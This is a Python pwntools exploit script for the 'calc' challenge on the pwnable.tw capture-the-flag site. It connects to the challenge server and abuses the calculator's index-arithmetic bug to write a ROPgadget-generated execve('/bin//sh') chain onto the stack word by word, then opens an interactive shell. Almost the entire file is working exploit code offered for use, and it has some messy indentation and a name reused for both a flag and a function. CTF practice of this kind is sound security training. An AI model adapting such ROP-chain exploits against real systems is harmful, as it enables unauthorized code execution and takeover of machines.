from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./calc")
else:
	p = remote("chall.pwnable.tw",10100)


def ropchain():
	#!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''

        p += pack('<I', 0x080701aa) # pop edx ; ret
        p += pack('<I', 0x080ec060) # @ .data
        p += pack('<I', 0x0805c34b) # pop eax ; ret
        p += '/bin'
        p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080701aa) # pop edx ; ret
        p += pack('<I', 0x080ec064) # @ .data + 4
        p += pack('<I', 0x0805c34b) # pop eax ; ret
        p += '//sh'
        p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080701aa) # pop edx ; ret
        p += pack('<I', 0x080ec068) # @ .data + 8
        p += pack('<I', 0x080550d0) # xor eax, eax ; ret
        p += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
        p += pack('<I', 0x080481d1) # pop ebx ; ret
        p += pack('<I', 0x080ec060) # @ .data
        p += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
        p += pack('<I', 0x080ec068) # @ .data + 8
        p += pack('<I', 0x080ec060) # padding without overwrite ebx
        p += pack('<I', 0x080701aa) # pop edx ; ret
        p += pack('<I', 0x080ec068) # @ .data + 8
        p += pack('<I', 0x080550d0) # xor eax, eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x0807cb7f) # inc eax ; ret
        p += pack('<I', 0x08049a21) # int 0x80
	return p
	
def calcu(index,target):
	payload = "+{index}".format(index=index)
	p.sendline(payload)
	info = int(p.recvline().strip("\n"))
	log.success("index:"+str(index)+" info:"+hex(info)+" target:"+hex(target))
	if info > 0:
		p.sendline("+{index}-{info}+{target}".format(index=index,info=info,target=target))
		p.recvline()
	elif info == 0:
		p.sendline("+{index}+{target}".format(index=index,target=target))
		p.recvline()
	else:
		p.sendline("+{index}+{info}+{target}".format(index=index,info=-info,target=target))
		p.recvline()

def debug():
	gdb.attach(p,"b *0x08048EE1")

context.log_level = "debug"
ropdata = ropchain()
p.recvuntil("=== Welcome to SECPROG calculator ===\n")
index = (0x5A0 + 4)/4
for i in range(len(ropdata)/4):
	calcu(index+i,u32(ropdata[i*4:i*4+4]))
p.sendline()
p.interactive()

